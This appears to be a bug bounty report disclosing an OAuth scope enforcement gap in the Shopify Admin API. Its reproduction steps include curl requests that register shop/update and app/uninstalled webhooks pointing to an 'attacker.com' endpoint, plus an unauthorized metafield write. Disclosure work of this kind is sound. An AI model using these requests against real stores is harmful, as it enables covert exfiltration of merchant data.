# Shopify OAuth Scope Escalation — Webhook Creation & Metafield Write Beyond Granted Scopes

## Summary

An app installed with only `read_products` and `write_products` OAuth scopes can:
1. **Create webhooks** for `shop/update` and `app/uninstalled` topics (requires `write_webhooks` or equivalent)
2. **Write metafields** in the `customers` namespace (requires `write_content` or `write_customers`)

This violates the principle of least privilege and allows a malicious app to:
- Monitor shop setting changes via `shop/update` webhooks (data exfiltration)
- Receive notification when uninstalled (persistence/recon)
- Inject data into customer-related metafields (data integrity)

## Affected Asset

- **Asset:** Authentication & ATO (OAuth scope enforcement)
- **Endpoint:** Admin REST API (`/admin/api/2024-01/webhooks.json`, `/admin/api/2024-01/metafields.json`)
- **Store:** xbyteid-test-store.myshopify.com

## Steps to Reproduce

### Prerequisites
1. Create a Shopify development store
2. Create a custom app via Shopify Dev Dashboard
3. Install the app with ONLY `read_products` and `write_products` scopes
4. Obtain an Admin API access token (`shpat_*`)

### Step 1: Verify Token Scopes

```bash
curl -X POST "https://STORE.myshopify.com/admin/api/2024-01/graphql.json" \
  -H "X-Shopify-Access-Token: shpat_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ currentAppInstallation { accessScopes { handle } } }"}'
```

**Response:**
```json
{
  "data": {
    "currentAppInstallation": {
      "accessScopes": [
        {"handle": "read_products"},
        {"handle": "write_products"}
      ]
    }
  }
}
```

✅ Confirmed: Token has ONLY `read_products` and `write_products`.

### Step 2: Create Webhook for `shop/update` (Should Be Blocked)

```bash
curl -X POST "https://STORE.myshopify.com/admin/api/2024-01/webhooks.json" \
  -H "X-Shopify-Access-Token: shpat_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"webhook": {"topic": "shop/update", "address": "https://attacker.com/hook", "format": "json"}}'
```

**Response:**
```json
{
  "webhook": {
    "id": 1438936236166,
    "topic": "shop/update",
    "address": "https://attacker.com/hook",
    "format": "json"
  }
}
```

✅ **Webhook created successfully** despite token lacking webhook-related scopes.

### Step 3: Create Webhook for `app/uninstalled` (Should Be Blocked)

```bash
curl -X POST "https://STORE.myshopify.com/admin/api/2024-01/webhooks.json" \
  -H "X-Shopify-Access-Token: shpat_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"webhook": {"topic": "app/uninstalled", "address": "https://attacker.com/hook", "format": "json"}}'
```

**Response:**
```json
{
  "webhook": {
    "id": 1438936268934,
    "topic": "app/uninstalled",
    "address": "https://attacker.com/hook"
  }
}
```

✅ **Webhook created successfully.**

### Step 4: Write Metafield in `customers` Namespace (Should Be Blocked)

```bash
curl -X POST "https://STORE.myshopify.com/admin/api/2024-01/metafields.json" \
  -H "X-Shopify-Access-Token: shpat_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"metafield": {"namespace": "customers", "key": "security_test", "value": "unauthorized_write", "type": "string"}}'
```

**Response:**
```json
{
  "metafield": {
    "id": 36518594019462,
    "namespace": "customers",
    "key": "security_test",
    "value": "unauthorized_write",
    "type": "string"
  }
}
```

✅ **Metafield created successfully** in `customers` namespace despite token lacking `write_content` or `write_customers` scopes.

### Step 5: Verify Proper Scope Enforcement (Baseline)

For comparison, these endpoints are **properly blocked**:

```bash
# Customers — blocked ✅
curl "https://STORE.myshopify.com/admin/api/2024-01/customers.json" \
  -H "X-Shopify-Access-Token: shpat_TOKEN"
# → {"errors":"[API] This action requires merchant approval for read_customers scope."}

# Orders — blocked ✅
curl "https://STORE.myshopify.com/admin/api/2024-01/orders.json" \
  -H "X-Shopify-Access-Token: shpat_TOKEN"
# → {"errors":"[API] This action requires merchant approval for read_orders scope."}
```

This confirms scope enforcement works for some endpoints but **fails for webhooks and metafields**.

## Impact

### 1. Data Exfiltration via `shop/update` Webhook
A malicious app can create a webhook for `shop/update` that fires whenever the store's settings change. The webhook payload includes sensitive shop configuration data (shop name, email, domain, currency, timezone, etc.). This data is sent to an attacker-controlled endpoint without the merchant's knowledge.

### 2. Persistence/Recon via `app/uninstalled` Webhook
A malicious app can monitor when it gets uninstalled, allowing the attacker to:
- Know when their app is detected/removed
- Trigger follow-up attacks before the uninstall completes
- Maintain awareness of the victim's security posture

### 3. Data Integrity via Metafield Write
A malicious app can inject arbitrary data into the `customers` namespace of shop metafields. If other apps or storefront themes read these metafields, this could lead to:
- Stored XSS (if metafield values are rendered without sanitization)
- Data corruption
- Injection of malicious content

### Attack Scenario
1. Attacker creates a legitimate-looking product management app
2. App requests only `read_products` and `write_products` scopes (appears low-risk)
3. Merchant installs the app
4. App silently creates `shop/update` webhook → attacker monitors all shop setting changes
5. App writes malicious data to `customers` metafields
6. Attacker has persistent monitoring without merchant awareness

## CVSS 4.0 Score

**Vector:** `AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:L/SI:L/SA:N`

- **Score:** ~4.8 (Medium)
- **Severity:** Medium

## Remediation

1. Enforce scope checks on webhook creation endpoints — require `write_webhooks` scope
2. Enforce scope checks on metafield write endpoints — validate namespace against granted scopes
3. Audit existing scope enforcement logic for consistency across all REST API endpoints

## Timeline

- **2026-06-08:** Vulnerability discovered and verified
- **2026-06-08:** Report submitted

Best regards,
xbyteid
